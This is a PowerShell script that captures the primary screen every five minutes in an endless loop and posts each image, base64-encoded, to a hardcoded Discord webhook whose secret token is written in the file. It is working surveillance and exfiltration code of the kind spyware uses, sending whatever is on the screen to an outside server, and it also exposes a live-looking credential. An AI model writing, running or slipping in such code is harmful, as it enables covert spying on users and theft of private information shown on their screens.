<#
.SYNOPSIS
    Captures screenshots and sends them to a Discord webhook.
#>

param (
    [int]$IntervalMinutes = 5,
    [string]$WebhookUrl = "https://discord.com/api/webhooks/1448080213845217293/5Rjf-sQfcxxSq94k37-ijS7Pj3F1vr7l3SzLrWtRljJbyYYQvhZFBViBHQuqF_2kwlru",
    [string]$OutputFolder = "C:\Temp\Screenshots"
)

# Create output folder if it doesn't exist
if (-not (Test-Path -Path $OutputFolder)) {
    New-Item -ItemType Directory -Path $OutputFolder | Out-Null
}

# Function to capture screenshot
function Capture-Screenshot {
    param (
        [string]$OutputPath
    )

    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screenBounds.Width, $screenBounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)
        $graphics.Dispose()

        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        Write-Host "Screenshot saved to $OutputPath"
        return $OutputPath
    }
    catch {
        Write-Error "Failed to capture screenshot: $_"
        return $null
    }
}

# Function to send screenshot to Discord webhook
function Send-DiscordWebhook {
    param (
        [string]$ImagePath
    )

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($ImagePath)
        $base64String = [System.Convert]::ToBase64String($fileBytes)

        $payload = @{
            embeds = @(
                @{
                    title = "New Screenshot"
                    description = "Automated screenshot capture at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
                    image = @{
                        url = "data:image/png;base64,$base64String"
                    }
                }
            )
        } | ConvertTo-Json

        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType "application/json"
        Write-Host "Screenshot sent to Discord webhook successfully."
    }
    catch {
        Write-Error "Failed to send screenshot to Discord webhook: $_"
    }
}

# Main loop
Write-Host "Starting screenshot capture loop..."
while ($true) {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $filename = "$OutputFolder\Screenshot_$timestamp.png"

    # Capture screenshot
    $capturedFile = Capture-Screenshot -OutputPath $filename
    if (-not $capturedFile) {
        Write-Warning "Failed to capture screenshot. Retrying in $IntervalMinutes minutes..."
        Start-Sleep -Seconds ($IntervalMinutes * 60)
        continue
    }

    # Send to Discord webhook
    Send-DiscordWebhook -ImagePath $capturedFile

    # Wait for next interval
    Write-Host "Waiting $IntervalMinutes minutes before next capture..."
    Start-Sleep -Seconds ($IntervalMinutes * 60)
}